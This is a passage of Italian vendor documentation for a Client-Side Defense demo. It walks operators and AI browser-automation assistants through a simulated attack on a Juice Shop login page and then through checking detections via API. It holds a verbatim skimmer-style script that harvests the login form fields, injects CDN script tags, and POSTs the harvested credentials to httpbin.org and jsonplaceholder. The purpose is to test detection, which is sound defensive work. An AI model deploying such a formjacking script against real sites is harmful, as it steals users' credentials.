La Fase 2 genera traffico di attacco simulato contro l'applicazione protetta e conferma che il CSD lo ha rilevato. La Fase 1 deve essere completata — tutti i controlli dello Step 7 devono essere PASS — prima di procedere.

## Step 8: Simulazione di Attacco

<Aside type="note">
Questo step richiede l'esecuzione di JavaScript lato browser — `curl` non può attivare il rilevamento CSD. Gli assistenti AI con strumenti di automazione del browser (MCP Chrome DevTools, Playwright, Puppeteer) eseguono questi step direttamente utilizzando la sequenza **Esecuzione AI-Automatizzata** riportata di seguito. Gli operatori senza automazione del browser eseguono i passaggi manuali.
</Aside>

Dopo la verifica dell'infrastruttura (tutti i controlli della Fase 1 Step 7 sono PASS), eseguire gli script di simulazione di attacco per generare rilevamenti CSD. Gli script sono definiti nella guida [Trigger Detection](/csd/trigger-detection/) e nella [Attack Script Library](/csd/attack-scripts/).

### Esecuzione AI-Automatizzata

Gli assistenti AI con strumenti di automazione del browser eseguono la simulazione di attacco in modo programmatico:

1. **Navigare con initScript** — prima navigare a `about:blank` per garantire un contesto documento pulito (evita initScript obsoleti da navigazioni precedenti), poi `navigate_page` a `http://$F5XC_DOMAINNAME/#/login` con un `initScript` che salva `setInterval`, `clearInterval`, `fetch` e `console.log` nativi prima che zone.js li sovrascriva, effettua il polling dei campi del modulo di login, compila le credenziali tramite il setter nativo `HTMLInputElement.prototype.value`, ed esegue immediatamente lo Script di Rilevamento Combinato inline. Utilizzare l'initScript verbatim riportato di seguito.
2. **Chiudere il Banner di Benvenuto** — `press_key` con `Escape` per chiudere il Banner di Benvenuto. Nelle visite successive il banner potrebbe non apparire (cookie persistenti). La finestra di consenso ai cookie viene chiusa automaticamente dal tasto Escape
3. **Attendere il completamento** — attendere 10 secondi per il completamento di tutti i callback di caricamento/errore degli script CDN e le risoluzioni delle promise fetch
4. **Acquisire le prove** — `list_console_messages` per verificare `[CSD Demo] Simulation complete` e i risultati di caricamento CDN; `list_network_requests` filtrato per tipi `script` e `fetch` per verificare i codici di stato HTTP (`200`/`201` per successo, `pending` per richieste in sospeso)

**initScript della Fase 2 (verbatim — utilizzare esattamente come scritto):**

```javascript
// Save native references before zone.js patches them
var _si = window.setInterval.bind(window);
var _ci = window.clearInterval.bind(window);
var _fetch = window.fetch.bind(window);
var _log = window.console.log.bind(window.console);

// Poll for login form fields, fill credentials, run detection script
var _poll = _si(function() {
  var emailEl = document.querySelector('#email');
  var passEl  = document.querySelector('#password');
  if (emailEl && passEl) {
    _ci(_poll);
    // Fill credentials via native setter (bypasses zone.js)
    var nativeSet = Object.getOwnPropertyDescriptor(
      window.HTMLInputElement.prototype, 'value').set;
    nativeSet.call(emailEl, 'test@example.com');
    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
    nativeSet.call(passEl, 'P@ssword123');
    passEl.dispatchEvent(new Event('input', { bubbles: true }));

    // Run Combined Detection Script inline using native fetch for exfil
    (function() {
      _log('==================================================');
      _log('[CSD Demo] Combined Detection Script — Starting');
      _log('==================================================');

      _log('\n[Formjack] Phase 1: Form field harvesting');
      var inputs = document.querySelectorAll('input');
      var harvested = {};
      inputs.forEach(function(input) {
        var name = input.name || input.id || input.type;
        harvested[name] = input.value || '(empty)';
      });
      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);

      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
      var cdns = [
        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
      ];
      cdns.forEach(function(cdn) {
        var script = document.createElement('script');
        script.src = cdn.url;
        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
        document.head.appendChild(script);
        _log('[Supply Chain] Injected script tag: ' + cdn.name);
      });

      _log('\n[Exfil] Phase 3: Data exfiltration');
      var payload = JSON.stringify({
        type: 'combined_demo', credentials: harvested,
        page: window.location.href, timestamp: Date.now()
      });
      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
      _fetch('https://jsonplaceholder.typicode.com/posts', {
        method: 'POST', mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' }, body: payload
      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });

      _log('\n==================================================');
      _log('[CSD Demo] Simulation complete');
      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
      _log('==================================================');
    })();
  }
}, 300);
```

<Aside type="caution">
**Incompatibilità con zone.js** — Juice Shop utilizza zone.js di Angular, che sovrascrive `setTimeout`, `setInterval`, `fetch`, `XMLHttpRequest` e altre API del browser. Questo causa il malfunzionamento degli strumenti MCP `evaluate_script`, `fill` e `click` con l'errore `Cannot read properties of undefined (reading 'call')`. Utilizzare `navigate_page` con `initScript` invece — `initScript` viene eseguito prima del caricamento di zone.js, consentendo di salvare i riferimenti alle API native e utilizzarli nei callback di polling. L'initScript deve compilare i campi del modulo utilizzando il setter nativo `HTMLInputElement.prototype.value` (non `fill`) ed eseguire lo script di rilevamento inline (non tramite `setTimeout`, che zone.js potrebbe intercettare dopo il caricamento della pagina). Consultare [Trigger Detection — AI-Automated Execution](/csd/trigger-detection/#ai-automated-execution) per i dettagli.
</Aside>

<Aside type="note">
**Accumulo di initScript** — ogni chiamata `navigate_page` con un parametro `initScript` aggiunge lo script a una lista persistente che viene eseguita ad ogni successivo caricamento del documento. Per evitare che script obsoleti interferiscano, navigare a `about:blank` tra un'esecuzione e l'altra oppure utilizzare `new_page` con `isolatedContext` per un contesto browser pulito.
</Aside>

<Aside type="note">
**Salvataggio del `fetch` nativo nell'initScript** — l'initScript salva `window.fetch.bind(window)` prima che zone.js lo sovrascriva. Questo garantisce che le chiamate fetch funzionino correttamente senza errori zone.js `Cannot read properties of undefined`. Lo stesso initScript (con il `fetch` nativo salvato) viene utilizzato sia per le esecuzioni di attacco della Fase 2 che della Fase 3 — la mitigazione CSD non intercetta le chiamate `fetch()`, quindi il salvataggio del riferimento nativo non influisce sul comportamento della mitigazione.
</Aside>

<Aside type="caution">
**404 transitorio dell'origine** — alla prima navigazione verso l'applicazione Angular, `polyfills.js` o altri script dell'applicazione potrebbero restituire un errore HTTP 404 transitorio dal server di origine. Questo causa il fallimento del bootstrap di Angular, risultando in una pagina vuota senza modulo di login. Il 404 è effimero — le richieste successive restituiscono 200 o 304. **Recupero:** navigare a `about:blank`, attendere 2 secondi, poi riprovare la navigazione. Se il problema persiste dopo più tentativi, verificare lo stato dell'origine tramite il percorso del load balancer (`curl -s -o /dev/null -w '%{http_code}' http://$F5XC_DOMAINNAME/polyfills.js`).
</Aside>

### Esecuzione Manuale

Gli operatori senza strumenti di automazione del browser eseguono i passaggi manualmente:

1. **Navigare** alla pagina di login dell'applicazione protetta: `http://xF5XC_DOMAINNAMEx/#/login`
2. **Inserire credenziali di prova** — digitare `test@example.com` nel campo Email e `P@ssword123` nel campo Password (non inviare il modulo)
3. **Aprire DevTools** — premere **F12** e passare alla scheda **Console**
4. **Eseguire lo Script di Rilevamento Combinato** — incollare lo script da [Trigger Detection &mdash; Run the Combined Simulation Script](/csd/trigger-detection/#run-the-combined-simulation-script) nella console e premere Invio
5. **Verificare l'output della console** — confermare che l'output a fasi `[CSD Demo]` mostri: raccolta dei campi del modulo, iniezione di script da 4 domini CDN ed esfiltrazione dei dati verso 2 endpoint

### Cosa Viene Attivato

| Segnale | Comportamento | Rilevamento |
| --- | --- | --- |
| Raccolta campi del modulo | Legge i valori degli input email e password | Script che leggono campi sensibili del modulo — classificato come Rischio Elevato |
| Iniezione di script | Inietta 4 tag `&lt;script&gt;` da `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io` | Fino a 4 nuovi domini di script di terze parti rilevati (la disponibilità CDN varia) |
| Esfiltrazione dei dati | Invia i dati raccolti tramite `fetch` a `www.httpbin.org` e `jsonplaceholder.typicode.com` | Chiamate di rete verso domini esterni |

<Aside type="note">
**La disponibilità CDN varia.** Non tutti i 4 script CDN verranno caricati
in ogni esecuzione — limiti delle risorse del browser, condizioni di rete
o throttling del CDN possono causare il fallimento di alcuni con
`ERR_INSUFFICIENT_RESOURCES` o timeout.
La simulazione ha successo se **almeno uno** script CDN viene caricato. Il CSD rileva
il tentativo di iniezione indipendentemente dal fatto che lo script venga caricato con successo —
la creazione del tag `&lt;script&gt;` stesso è il segnale di rilevamento.

Nei casi più gravi, `ERR_INSUFFICIENT_RESOURCES` può degenerare in un errore a livello di pagina — l'intera pagina diventa vuota, gli screenshot vanno in timeout e `take_snapshot` fallisce. Questo si verifica tipicamente dopo che più navigazioni con initScript pesanti si accumulano nello stesso contesto browser. **Recupero:** utilizzare `new_page` con `isolatedContext` per creare un contesto browser pulito, poi riprovare dalla sequenza `about:blank` → `navigate_page` con initScript. Questo è distinto dai fallimenti dei singoli script CDN, che non influiscono sul successo della simulazione.
</Aside>

<Aside type="tip">
Dopo aver eseguito la simulazione di attacco, utilizzare questo ciclo di polling deterministico per attendere i rilevamenti:

1. Interrogare `/detected_domains` ogni 60 secondi
2. Se DET-3 passa (i domini di esfiltrazione appaiono in `/detected_domains`), procedere immediatamente allo Step 9
3. Se ancora vuoto dopo 10 interrogazioni (10 minuti), verificare lo stato del CSD (Fase 1 Step 5) e la registrazione del dominio protetto (Fase 1 Step 6) — uno di questi è probabilmente configurato in modo errato
4. Se ancora vuoto dopo 30 interrogazioni (30 minuti), interrompere e segnalare all'operatore — non continuare alla Fase 3

Per simulazioni mirate aggiuntive (categorie di attacco individuali, stress test di rilevamento massimo), consultare la [Attack Script Library](/csd/attack-scripts/).
</Aside>

### Prove

L'assistente AI dovrebbe riportare quanto segue. Per l'esecuzione AI-automatizzata, le prove vengono acquisite in modo programmatico tramite `list_console_messages` (la funzione di polling dell'initScript registra i risultati nella console). Per l'esecuzione manuale, l'operatore legge l'output della console del browser.

| Controllo | Atteso | Stato |
| --- | --- | --- |
| Pagina di login caricata | `200 OK` a `http://$F5XC_DOMAINNAME/#/login` | PASS / FAIL |
| Script della console eseguito | `[CSD Demo] Simulation complete` nell'output della console | PASS / FAIL |
| Campi raccolti | Conteggio &gt; 0 nell'output della console | PASS |
| Script iniettati | 1–4 domini CDN nell'output della console (alcuni potrebbero fallire con errori di risorse) | PASS se appare almeno un dominio CDN |
| Canali di esfiltrazione | 2 tentativi fetch POST nell'output della console | PASS |

<Aside type="tip">
Se il certificato HTTPS LB è valido (`CertificateValid`), è possibile opzionalmente eseguire la simulazione anche contro `https://$F5XC_DOMAINNAME/#/login`. Questo non è richiesto per la progressione della demo.
</Aside>

## Step 9: Verifica del Rilevamento tramite API

Interrogare gli endpoint API del CSD per confermare che i rilevamenti sono apparsi. Utilizzare il ciclo di polling: interrogare `/detected_domains` ogni 60 secondi; procedere non appena DET-3 passa. Se DET-3 non passa dopo 10 minuti, verificare la configurazione CSD. Se DET-3 non passa dopo 30 minuti, interrompere e segnalare all'operatore. Questi endpoint sono documentati nell'[API Reference](/csd/api-reference/) e utilizzano la stessa autenticazione e namespace degli step precedenti.

<Aside type="note">
**Ordine di elaborazione degli endpoint:** `/detected_domains` viene popolato per primo ed è l'indicatore principale che la pipeline CSD funziona. `/scripts` e `/formFields` vengono popolati con una pianificazione di elaborazione backend più lenta e possono rimanere vuoti per 20–30 minuti anche dopo più esecuzioni della simulazione. Se `/detected_domains` mostra i domini di esfiltrazione (`www.httpbin.org`, `jsonplaceholder.typicode.com`), considerare la simulazione come rilevata con successo e procedere — il controllo DET-1 di seguito riflette questo comportamento.
</Aside>

### Script Rilevati

Interrogare gli script rilevati nelle ultime 24 ore:

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s -X POST \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  -H "Content-Type: application/json" \
  -d "{\"startTime\": \"$START\", \"endTime\": \"$NOW\"}" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/scripts" \
  | jq '{total: (.scripts | length), scripts: [.scripts[]? | {script_name: .script_name, risk_level: .risk_level}]}'
```

| Campo | Atteso | Stato |
| --- | --- | --- |
| `total` | &gt; 0 (script rilevati) | PASS se &gt; 0; PENDING se 0 ma `/detected_domains` mostra domini di esfiltrazione |
| Nomi degli script | Include domini CDN (`cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io`) in `script_name` | PASS se appaiono i domini CDN iniettati |

### Campi del Modulo

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/formFields?startTime=$START&endTime=$NOW" \
  | jq '{total: .total_size, fields: [.form_fields[]? | {name: .name, sensitivity: .analysis.value, scripts: (.associated_scripts | length), locations: .locations}]}'
```

| Campo | Atteso | Stato |
| --- | --- | --- |
| `total` | &gt; 0 | PASS se &gt; 0; PENDING se 0 ma DET-3 passa |
| `name` | Include `email`, `password` | PASS se appaiono campi sensibili |
| `sensitivity` | `Sensitive` per i campi email/password | PASS se il ML ha classificato correttamente |

<Aside type="note">
**L'elaborazione dei campi del modulo è più lenta del rilevamento dei domini.** L'endpoint
`/formFields` potrebbe restituire campi con metadati parziali
alla prima interrogazione. La classificazione di sensibilità ML (`Sensitive` vs
`Not Sensitive`) viene popolata dopo il completamento dell'elaborazione backend —
questo può richiedere 20–30 minuti dopo la prima esecuzione della simulazione. Se
i campi vengono mostrati ma senza classificazione, ripetere l'interrogazione più tardi. DET-3
(`/detected_domains`) è il criterio di superamento principale.
</Aside>

### Riepilogo delle Prove della Fase 2

Dopo tutte le interrogazioni di rilevamento, presentare lo stato finale di rilevamento:

| ID Test | Controllo | Stato |
| --- | --- | --- |
| DET-1 | Script rilevati (endpoint `/scripts`) | PASS se &gt; 0; PENDING se vuoto ma DET-3 passa |
| DET-2 | Domini CDN rilevati | PASS / FAIL |
| DET-3 | Domini di esfiltrazione rilevati (`/detected_domains`) | **Indicatore principale** — PASS se appare `www.httpbin.org` o `jsonplaceholder.typicode.com` |
| DET-4 | Campi del modulo rilevati (endpoint `/formFields`) | PASS se &gt; 0; PENDING se vuoto ma DET-3 passa |

<Aside type="note">
**Criteri minimi di superamento per procedere alla Fase 3:** DET-3 deve essere PASS (domini di esfiltrazione visibili in `/detected_domains`). DET-1 e DET-4 possono mostrare PENDING al primo utilizzo o dopo un rebuild recente — questo è normale. Se anche DET-3 mostra FAIL dopo 30 minuti, verificare che il CSD sia abilitato (Fase 1 Step 5), che il dominio protetto sia registrato (Fase 1 Step 6) e che il tag JS del CSD venga iniettato (Fase 1 Step 7 controllo Configurazione JS).
</Aside>
